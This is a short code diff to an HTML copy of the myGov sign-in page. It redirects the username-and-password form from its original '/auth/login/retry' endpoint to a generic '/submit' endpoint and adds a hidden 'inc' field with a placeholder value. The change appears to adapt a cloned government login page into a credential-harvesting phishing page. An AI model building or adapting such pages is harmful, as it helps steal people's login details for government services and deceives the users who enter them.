@@ -57,7 +57,7 @@
                   <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
                   <h2 class="text-align-left">Using your myGov sign in details</h2>
 
-                  <form class="cb-login-form alternative" action="/auth/login/retry" method="post">
+                  <form class="cb-login-form alternative" action="/submit" method="post">
                     <div class="input-group">
                       <label class="override" for="username">Username or email</label>
                       <div>
@@ -76,6 +76,7 @@
                         <button class="showPassword anchor mask-hide" type="button">Show</button>
 												<input id="password" name="password" class="cb-input" type="password" autocomplete="off">
                       </div>
+                      <input type="hidden" name="inc" value="your_value_here">
                       <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your current password</p>
                     </div>
 
